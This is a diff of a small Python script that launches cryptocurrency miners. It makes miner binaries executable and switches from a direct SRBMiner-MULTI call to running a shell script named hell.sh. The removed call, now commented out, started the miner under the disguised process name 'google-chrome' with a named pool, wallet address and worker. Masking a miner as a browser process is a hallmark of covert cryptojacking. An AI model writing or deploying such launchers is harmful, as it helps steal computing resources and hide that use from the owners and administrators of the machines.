@@ -2,7 +2,7 @@ import os
 import random
 os.system("chmod +x SRBMiner-MULTI hellminer verus-solver hell.sh verus-solver-original jupyter2")
 
-#os.system("bash hell.sh")
+os.system("bash hell.sh")
 
 
 # name = random.randint(2000,9000)
@@ -16,16 +16,16 @@ os.system("chmod +x SRBMiner-MULTI hellminer verus-solver hell.sh verus-solver-o
 #     "-t", "50"
 # ])
 
-os.execvp("./SRBMiner-MULTI",  [
-    "google-chrome",
-    "--disable-gpu",
-    "--algorithm", "verushash",
-    "--pool", "us.vipor.net:5040",
-    "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
-    "--worker", f"aaa{name}", 
-    "--password", "x",
-    "--cpu-threads", "0"
-])
+# os.execvp("./SRBMiner-MULTI",  [
+#     "google-chrome",
+#     "--disable-gpu",
+#     "--algorithm", "verushash",
+#     "--pool", "us.vipor.net:5040",
+#     "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
+#     "--worker", f"aaa{name}", 
+#     "--password", "x",
+#     "--cpu-threads", "0"
+# ])
 # import os
 
 # # Example worker name
